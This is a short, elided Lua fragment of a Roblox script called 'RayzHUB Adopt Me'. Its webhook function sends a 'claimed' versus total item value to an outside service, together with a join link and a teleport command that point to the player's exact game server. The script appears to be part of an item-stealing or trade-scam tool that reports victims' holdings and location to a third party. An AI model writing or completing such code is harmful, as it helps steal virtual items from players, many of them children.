...
local function sendWebhook(status)
    ...
    table.insert(previewLines, string.format("Total: %.2f / %.2f", claimedValue, totalValue))

    -- Link generation
    local joinLink = "https://rayzhubjoiner.vercel.app?placeId=" .. game.PlaceId .. "&jobId=" .. game.JobId
    ...
    local payload = {
        ...
        embeds = {{
            ...
            fields = {
                ...
                { name = "<:rayz_mod:1459652587409379481>Teleport Script", value = "`game:GetService('TeleportService'):TeleportToPlaceInstance(" .. game.PlaceId .. ", '" .. game.JobId .. "')\n`", inline = false },
...
print("[Script RayzHUB] Adopt Me Loaded")
